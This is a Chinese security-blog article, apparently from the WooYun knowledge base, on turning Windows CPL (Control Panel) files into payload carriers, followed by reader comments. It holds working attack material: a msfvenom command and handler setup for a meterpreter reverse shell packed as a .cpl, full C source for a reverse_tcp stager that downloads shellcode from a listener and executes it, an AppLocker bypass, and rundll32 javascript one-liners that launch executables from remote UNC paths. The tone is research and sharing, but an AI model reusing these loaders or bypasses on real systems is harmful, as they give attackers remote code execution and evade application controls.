@@ -1,0 +1,145 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CPL文件利用介绍</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2016/05/23 9:41" ui-time="" datetime="2016/05/23 9:41" class="published ng-binding ng-isolate-scope">2016/05/23 9:41</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>最近在研究<code>Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)</code>的过程中接触到了cpl文件，于是对其做了进一步研究，发现了一些有趣的细节，分享给大家。</p><h1>0x01 简介</h1><hr><p>CPL文件，是Windows控制面板扩展项，CPL全拼为<code>Control Panel Item</code><br>在系统安装目录的system32下面有一系列.cpl文件,它们分别对应着控制面板中的项目<br>CPL文件本质是Windows可执行性文件，但不属于可以直接独立运行的文件，通常由shell32.dll打开</p><h1>0x02 制作CPL文件</h1><hr><h2>1、文件特点</h2><p>本质上是DLL文件，但有如下特点：</p><ul><li>后缀名为cpl</li><li>包含一个导出函数CPLApplet</li><li>可双击直接运行</li></ul><h2>2、打开方式</h2><p><strong>(1) 双击直接运行</strong></p><p><strong>(2) cmd下输入<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code></strong></p><p><strong>(3) cmd下输入<code>control &lt;文件名&gt;</code></strong></p><p><strong>注：</strong><br>cmd下<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code>等同于cmd下<code>control &lt;文件名&gt;</code><br>control.exe实质调用了rundll32.exe，通过control.exe执行cpl文件的进程为rundll32.exe</p><p><strong>(4) 通过脚本调用</strong><br><strong>a、</strong>vbs</p><pre><code>#!shell
+Dim obj
+Set obj = CreateObject("Shell.Application")
+obj.ControlPanelItem("test.cpl")
+</code></pre><p><strong>b、</strong>js</p><pre><code>#!javascript
+var a = new ActiveXObject("Shell.Application");
+a.ControlPanelItem("c:\\test\\test.cpl");
+</code></pre><h2>3、使用vc 6.0制作标准cpl模板</h2><p>由文件特点可知，cpl本质就是一个dll文件<br>所以我们可以在vc下创建一个dll的工程，并定义导出函数为CPlApplet</p><pre><code>#!c
+LRESULT APIENTRY CPlApplet
+(
+    HWND    aHwndCPL_in,    // Handle to Configuration Panel window.
+    UINT    aUMsg_in,        // CPL message.
+    LPARAM    aLParam1_in,    // First message parameter.
+    LPARAM  aLParam2_in    // Second message parameter.
+) 
+</code></pre><p>值得注意的是aUMsg_in里面定义了一些CPL相关的参数：</p><pre><code>                   | Return            | Return
+CPL message        | if successfully   | if not successfully
+-------------------+-------------------+--------------------
+CPL_INIT           | nonzero           | zero
+CPL_GETCOUNT       | nonzero           | zero
+CPL_NEWINQUIRE     | zero              | nonzero
+CPL_SELECT         | zero              | nonzero
+CPL_DBLCLK         | zero              | nonzero
+CPL_STOP           | zero              | nonzero
+CPL_EXIT           | zero              | nonzero
+</code></pre><p>图表来自http://www.codeproject.com/Articles/3026/Creating-a-Config-Panel-Applet</p><p><strong>CPL_INIT：</strong><br>进行全局初始化</p><p><strong>CPL_GETCOUNT：</strong><br>检索应用程序支持的对话框的数目<br>返回值：支持的对话框数目</p><p><strong>CPL_NEWINQUIRE：</strong><br>请求该应用程序支持的对话框的请求信息</p><p><strong>CPL_SELECT：</strong><br>设置当用户选择一个对话框时显示的图标</p><p><strong>CPL_DBLCLK：</strong><br>设置当用户双击一个对话框时显示的图标</p><p><strong>CPL_STOP：</strong><br>控制面板关闭时向每个对话框发出的消息</p><p><strong>CPL_EXIT：</strong><br>释放内存，退出</p><p>以上仅对相关函数作简要介绍，详细说明可查msdn，提供一个可供参考的工程模板：<br>http://www.vbforums.com/attachment.php?s=7ebc3a64c985f675615a3e9d0aa350e8&amp;attachmentid=286&amp;d=981822351</p><p><strong>注：</strong><br>函数注释的语言为斯洛文尼亚语，但不影响我们的程序开发<br>模板下载后可直接编译出一个cpl文件，双击正常执行</p><h2>4、简单粗暴的方式制作cpl文件</h2><p>新建一个标准dll工程，在<code>DLL_PROCESS_ATTACH</code>中添加payload 相关代码之下：</p><pre><code>#!c
+#include "Windows.h"
+BOOL APIENTRY DllMain( HANDLE hModule, 
+                       DWORD  ul_reason_for_call, 
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:
+            WinExec("cmd", SW_SHOW);
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+</code></pre><p>编译后生成的dll文件后缀名改为cpl即可</p><p>如图</p><p><img alt="Alt text" img-src="e7c8023f6d819e987f2458dfd5bb42a84b1c5d63.jpg"></p><p>点击后弹出cmd，但是退出后会弹框提示程序兼容性问题<br>如果是管理员权限的cmd，运行的程序结束后就不会弹框<br><strong>(此问题的解决方法放在后面介绍)</strong></p><h1>0x03 测试</h1><hr><p>由以上内容可推断只要将payload写在DllMain()函数中，就可以直接修改dll后缀名为cpl，然后通过双击来运行<br>所以自然而然的想到了测试一下meterpreter是否支持这种方式</p><p><strong>生成test.cpl：</strong></p><pre><code>#!shell
+msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o test.cpl
+</code></pre><p><strong>msf：</strong></p><pre><code>#!shell
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.127.132
+set LPORT 8888
+exploit
+</code></pre><p>双击test.cpl后弹回meterpreter shell<br>但是同样在退出的时候会弹框提示程序兼容性助手</p><h1>0x04 解决问题</h1><hr><h2>1、正常dll执行后弹框</h2><p>经过测试发现，原有是因为vc6.0的版本低导致的程序兼容问题<br>所以换在vs2008(或者更新的版本)下开发就不会存在这个问题</p><p>如图</p><p><img alt="Alt text" img-src="cd72e44881f77c79f0e28f206f2427a92e9abbe9.jpg"></p><h2>2、解决meterpreter弹框的问题</h2><p>这里不深入探究msfvenom的生成方式，解决方法为使用c++程序自己编写一个meterpreter的reverse_tcp版本<br><strong>关键代码：</strong></p><pre><code>#!c
+#include "Windows.h"
+#include &lt;WinSock2.h&gt;
+#include &lt;stdio.h&gt;  
+
+#pragma comment(lib,"WS2_32.lib")   
+
+int reverse_tcp()
+{
+    WSADATA wsData;
+        if(WSAStartup(MAKEWORD(2,2),&amp;wsData))
+        {
+            printf("WSAStartp fail.\n");
+            return 0;
+        } 
+
+        SOCKET sock = WSASocket(AF_INET,SOCK_STREAM,0,0,0,0);
+        SOCKADDR_IN server;
+        ZeroMemory(&amp;server,sizeof(SOCKADDR_IN));
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = inet_addr("192.168.127.132"); //server ip
+        server.sin_port = htons(8888); //server port
+        if(SOCKET_ERROR == connect(sock,(SOCKADDR*)&amp;server,sizeof(server)))
+        {
+            printf("connect to server fail.\n");
+            closesocket(sock);
+            WSACleanup();
+            return 0;
+        } 
+
+        u_int payloadLen;
+        if (recv(sock,(char*)&amp;payloadLen,sizeof(payloadLen),0) != sizeof(payloadLen))
+        {
+            printf("recv error\n");
+            closesocket(sock);
+            WSACleanup();
+            return 0;
+        } 
+
+        char* orig_buffer = (char*)VirtualAlloc(NULL,payloadLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+        char* buffer = orig_buffer;
+        int ret = 0;
+        do 
+        {
+            ret = recv(sock,buffer,payloadLen,0);
+            buffer += ret;
+            payloadLen -= ret;
+        } while (ret &gt; 0 &amp;&amp; payloadLen &gt; 0);  
+
+
+        __asm
+        {
+            mov edi,sock;   
+            jmp orig_buffer; 
+        } 
+
+        VirtualFree(orig_buffer,0,MEM_RELEASE);   
+
+
+}   
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                      DWORD  ul_reason_for_call,
+                      LPVOID lpReserved
+                      )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        reverse_tcp();
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre><p>生成dll文件，后缀名改为cpl<br>正常运行，正常退出</p><h1>0x05 Bypass Windows AppLocker</h1><hr><p>之前介绍过《Bypass Windows AppLocker》<br>开启默认规则后会拦截exe和脚本的执行，那么cpl文件呢？<br>当然可以绕过 Windows AppLocker的限制规则</p><p>如图</p><p><img alt="Alt text" img-src="9bc1fe87fcfefed8c7a12ba6f4a7efd6249f0c17.jpg"></p><h1>0x06 rundll32</h1><hr><p>补充一些rundll32调用js代码的细节;</p><p><strong>执行远程exe,会弹框拦截：</strong></p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("\\\\127.0.0.1\\c$\\test\\test.exe")
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="623040b862e2f5cda9f164fc89c6e89910d48da0.jpg"></p><p><strong>解决方法：</strong></p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\test.exe")
+</code></pre><p>如图 <img alt="Alt text" img-src="2b9db29a8ecd59d044334126bf32ae6af5b182c0.jpg"></p><p><strong>执行本地cpl文件，会弹框提示无法识别文件后缀名：</strong></p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("c:\\test\\cpl.cpl")
+</code></pre><p>如图</p><p><img alt="Alt text" img-src="211f1aee8fc238d336613399129384704d4f85eb.jpg"></p><p><strong>解决方法：</strong></p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c c:\\test\\cpl.cpl",0,true)
+</code></pre><p><strong>遗留问题：</strong></p><p><strong>1、无法调用Shell.Application直接执行cpl文件：</strong></p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new20%ActiveXObject("Shell.Application").ControlPanelItem("c:\\test\\cpl.cpl")
+</code></pre><p><strong>2、无法远程调用cpl文件</strong></p><p>无法识别文件后缀：</p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("\\\\127.0.0.1\\c$\\test\\cpl.cpl")
+</code></pre><p>弹框拦截远程文件：</p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Exec("cmd /c \\\\127.0.0.1\\c$\\test\\cpl.cpl")
+</code></pre><p>and</p><pre><code>#!javascript
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c \\\\127.0.0.1\\c$\\test\\cpl.cpl",0,true)
+</code></pre><p>如果你有解决办法或是更好的思路，希望能够分享，不胜感激。</p><h1>0x07 Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059)</h1><hr><p>下载链接：<a href="https://www.exploit-db.com/exploits/39805/">https://www.exploit-db.com/exploits/39805/</a></p><p>将定制的快捷方式放于任意路径，本地或是远程，当用户访问此目录的时候，就会执行payload<br>演示的远程路径为： <code>\\127.0.0.1\c$\test\poc</code>（正常情况下访问此目录也会当作远程目录被沙盒拦截）</p><p>poc演示如图，访问远程目录 <code>\\127.0.0.1\c$\test\poc</code>并绕过沙盒拦截，成功执行payload</p><p><img alt="Alt text" img-src="728a300b82096ccbc11bebf292a7116c56bbfb77.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cmdhz</span> <span class="reply-time">2016-06-03 11:31:42</span></div><p></p><p>“当用户访问此目录的时候，就会执行payload”对这一个问题其他人员已经做了疑问，尽管您给出肯定的回答，但是我依旧提出疑问。为此还翻出了MS10-046、ms15-020漏洞进行回顾。从经验上看，如果能够在访问目录时得到执行权限，应该是发生了漏洞。望释疑: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="026e6b716e323142656f636b6e2c616d6f">[email&#160;protected]</a></p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxx</span> <span class="reply-time">2016-05-27 10:29:02</span></div><p></p><p>双击运行cpl有什么限制吗？我在有些系统下压根就不能成功运行cpl...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">毕月乌</span> <span class="reply-time">2016-05-24 16:13:43</span></div><p></p><p>神奇的三好学生又放大招~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark</span> <span class="reply-time">2016-05-24 14:28:11</span></div><p></p><p>给力</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-24 09:28:43</span></div><p></p><p>@xcrypt试着改下shellcode/生成64位的程序</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-05-24 09:27:35</span></div><p></p><p>@maybe @XXXX 抱歉，具体构造方法还是不在这里介绍了，但可以明确的是只要访问目录就会执行payload</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">XXXX</span> <span class="reply-time">2016-05-24 08:51:52</span></div><p></p><p>将定制的快捷方式放于任意路径，本地或是远程，当用户访问此目录的时候，就会执行payload<br>应该还是需要点击吧？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xcrypt</span> <span class="reply-time">2016-05-23 14:56:59</span></div><p></p><p>c++写的那个meterpreter的reverse_tcp版本，在win7 x64上测试时，虽然能得到meterpreter的提示符，但执行不了命令，很快就提示“Meterpreter session 1 closed”</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">autO_pw</span> <span class="reply-time">2016-05-23 14:08:21</span></div><p></p><p>赞~\(≧▽≦)/~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">maybe</span> <span class="reply-time">2016-05-23 13:51:58</span></div><p></p><p>感谢大牛分享。<br>当用户访问此目录的时候，就会执行payload<br>为什么我测试时必须点击才能执行呢？这个特殊的快捷方式是怎样构造的？？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Little_Nicky</span> <span class="reply-time">2016-05-23 10:53:36</span></div><p></p><p>这个不错啊~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2016-05-23 09:55:44</span></div><p></p><p>学习。。不错</p><p></p></div></div></div></div></div></main>
